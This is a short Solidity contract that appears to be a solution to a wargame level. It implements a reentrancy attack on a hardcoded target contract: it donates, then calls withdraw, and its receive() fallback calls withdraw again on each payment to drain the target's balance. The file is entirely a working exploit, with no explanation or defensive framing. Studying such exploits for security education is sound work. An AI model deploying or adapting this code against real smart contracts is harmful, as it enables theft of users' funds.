// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

contract Reentrance {
    address target = 0xDE969Fc39199e40071E9c2a11DdCfEDE2Cb356dC;
    uint256 amount;

    function donate() public payable {
        (bool success, bytes memory data) = payable(target).call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, string(data));

        amount = msg.value;
    }

    function withdraw() public {
        (bool success, bytes memory data) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, string(data));
    }

    receive() external payable {
        (bool success, bytes memory data) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, string(data));
    }
}